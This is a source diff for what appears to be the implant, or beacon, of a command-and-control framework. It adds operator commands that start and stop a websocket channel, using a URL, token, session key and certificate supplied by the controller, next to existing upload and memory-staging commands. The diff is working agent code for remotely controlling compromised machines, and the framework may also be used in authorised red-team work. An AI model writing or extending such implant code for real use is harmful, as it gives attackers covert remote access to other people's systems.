@@ -118,6 +118,14 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
 
+#if defined(BEACON_HTTP)
+		case COMMAND_WEBSOCKET_START:
+			this->CmdWebsocketStart(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_WEBSOCKET_STOP:
+			this->CmdWebsocketStop(CommandId, inPacker, outPacker); break;
+#endif
+
 		case COMMAND_SAVEMEMORY:
 			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
 
@@ -965,6 +973,54 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 	agent->memorysaver->RemoveMemoryData(memoryId);
 }
+
+#if defined(BEACON_HTTP)
+void Commander::CmdWebsocketStart(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG memoryId = inPacker->Unpack32();
+	ULONG agentIdSize = 0;
+	CHAR* agentId = (CHAR*)inPacker->UnpackBytes(&agentIdSize);
+	ULONG urlSize = 0;
+	CHAR* url = (CHAR*)inPacker->UnpackBytes(&urlSize);
+	ULONG tokenSize = 0;
+	CHAR* token = (CHAR*)inPacker->UnpackBytes(&tokenSize);
+	ULONG sessionKeySize = inPacker->Unpack32();
+	BYTE* sessionKey = inPacker->UnpackBytes(&sessionKeySize);
+	ULONG certSize = inPacker->Unpack32();
+	BYTE* certData = inPacker->UnpackBytes(&certSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	DWORD errorCode = ERROR_INVALID_DATA;
+	if (!agent->memorysaver->chunks.contains(memoryId)) {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(errorCode);
+		return;
+	}
+
+	MemoryData memData = agent->memorysaver->chunks[memoryId];
+	BOOL result = agent->StartWebsocketChannel(memData, agentId, agentIdSize, url, urlSize, token, tokenSize, sessionKey, sessionKeySize, certData, certSize, &errorCode);
+
+	agent->memorysaver->RemoveMemoryData(memoryId);
+
+	if (result) {
+		outPacker->Pack32(COMMAND_WEBSOCKET_START);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(errorCode);
+	}
+}
+
+void Commander::CmdWebsocketStop(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG taskId = inPacker->Unpack32();
+	outPacker->Pack32(taskId);
+	agent->StopWebsocketChannel();
+	outPacker->Pack32(COMMAND_WEBSOCKET_STOP);
+}
+#endif
 
 
 
